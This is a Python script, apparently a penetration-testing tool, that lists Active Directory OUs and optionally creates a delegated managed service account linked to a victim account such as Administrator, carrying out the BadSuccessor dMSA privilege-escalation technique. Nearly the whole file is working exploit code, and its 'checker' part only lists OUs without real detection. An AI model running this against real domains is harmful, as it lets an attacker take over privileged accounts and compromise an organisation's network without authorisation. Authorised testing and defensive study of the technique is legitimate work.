#!/usr/bin/env python3
"""
BadSuccessor dMSA Vulnerability Checker & Exploiter

Detects OUs where you can create dMSA accounts and (optionally) creates a dMSA and sets attributes for exploitation.

Usage:
    python3 zBadSuccessor.py -d <domain> -u <username> -p <password> -s <dc_ip>
    python3 zBadSuccessor.py -d <domain> -u <username> -p <password> -s <dc_ip> \
        --create-dmsa --ou-dn "OU=temp,DC=contoso,DC=com" --dmsa-name "BadSuccessorTest" \
        --victim-dn "CN=Administrator,CN=Users,DC=contoso,DC=com"
"""

import argparse
from ldap3 import Server, Connection, ALL, NTLM, SUBTREE, MODIFY_REPLACE

MSDS_MSA_GUID = "bf967a86-0de6-11d0-a285-00aa003049e2"

def find_vulnerable_ous(conn, naming_context):
    print("[+] Searching for OUs (manual ACL review required for full detection):")
    conn.search(search_base=naming_context,
                search_filter="(objectClass=organizationalUnit)",
                search_scope=SUBTREE,
                attributes=["distinguishedName"])
    for entry in conn.entries:
        print(f"  OU: {entry.distinguishedName.value}")

def create_bad_successor_dmsa(conn, ou_dn, dmsa_name, victim_dn):
    dmsa_dn = f"CN={dmsa_name},{ou_dn}"
    attributes = {
        'objectClass': ['msDS-ManagedServiceAccount'],
        'sAMAccountName': dmsa_name + '$',
        'msDS-ManagedAccountPrecededByLink': [victim_dn],
        'msDS-DelegatedMSAState': [2]
    }
    print(f"[*] Creating dMSA account '{dmsa_name}' in OU: {ou_dn}")
    success = conn.add(dmsa_dn, attributes=attributes)
    if not success:
        print(f"[!] Failed to create dMSA: {conn.result}")
        return
    print(f"[*] Setting msDS-ManagedAccountPrecededByLink to {victim_dn}")
    conn.modify(dmsa_dn, {
        'msDS-ManagedAccountPrecededByLink': [(MODIFY_REPLACE, [victim_dn])]
    })
    print(f"[*] Setting msDS-DelegatedMSAState to 2")
    conn.modify(dmsa_dn, {
        'msDS-DelegatedMSAState': [(MODIFY_REPLACE, [2])]
    })
    print("[+] dMSA account created and attributes set!")

def main():
    parser = argparse.ArgumentParser(description="Check for BadSuccessor (dMSA) privilege escalation in Active Directory.")
    parser.add_argument("-d", "--domain", required=True, help="AD domain (e.g., contoso.com)")
    parser.add_argument("-u", "--username", required=True, help="Username")
    parser.add_argument("-p", "--password", required=True, help="Password")
    parser.add_argument("-s", "--server", required=True, help="Domain Controller IP or hostname")
    parser.add_argument("--create-dmsa", action="store_true", help="Attempt to create a dMSA for exploitation")
    parser.add_argument("--ou-dn", help="OU DN to create the dMSA in")
    parser.add_argument("--dmsa-name", help="Name for the new dMSA account")
    parser.add_argument("--victim-dn", help="DistinguishedName of the victim account (e.g., Domain Admin DN)")
    args = parser.parse_args()

    server = Server(args.server, get_info=ALL)
    user = f"{args.domain}\\{args.username}"
    conn = Connection(server, user=user, password=args.password, authentication=NTLM, auto_bind=True)

    naming_context = conn.server.info.other['defaultNamingContext'][0]
    find_vulnerable_ous(conn, naming_context)

    if args.create_dmsa:
        if not (args.ou_dn and args.dmsa_name and args.victim_dn):
            print("[!] You must provide --ou-dn, --dmsa-name, and --victim-dn for dMSA creation.")
        else:
            create_bad_successor_dmsa(conn, args.ou_dn, args.dmsa_name, args.victim_dn)

if __name__ == "__main__":
    main()
